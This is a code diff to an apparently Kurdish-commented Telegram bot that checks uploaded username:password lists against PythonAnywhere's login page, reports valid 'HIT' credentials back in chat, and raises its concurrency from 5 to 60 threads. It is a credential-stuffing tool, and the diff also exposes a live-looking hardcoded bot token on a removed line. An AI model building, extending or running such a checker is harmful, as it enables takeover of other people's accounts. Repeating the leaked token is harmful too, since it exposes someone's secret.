@@ -10,10 +10,12 @@ from telegram.ext import (
     ContextTypes,
     filters
 )
+import os
 
-BOT_TOKEN = "6766946689:AAEj4jycH6Zvx0niEAyVJ8vQEIio7d_UWJ8"
+# ---------------- CONFIG ----------------
+BOT_TOKEN = os.getenv("TOKEN")  # توکن لە Railway Variables وەرگرە
 LOGIN_URL = "https://www.pythonanywhere.com/login/"
-MAX_THREADS = 5
+MAX_THREADS = 60
 
 headers = {
     "User-Agent": "Mozilla/5.0",
@@ -114,7 +116,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if result == "HIT":
             hit += 1
-            # 📤 تەنها HIT بنێرە
             await update.message.reply_text(
                 f"✅ HIT\n"
                 f"{username}:{password}\n"
@@ -123,7 +124,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             bad += 1
 
-        # 🔄 Live count update
         await status_msg.edit_text(
             f"🚀 Checking...\n\n"
             f"✅ Hit :- {hit}\n"
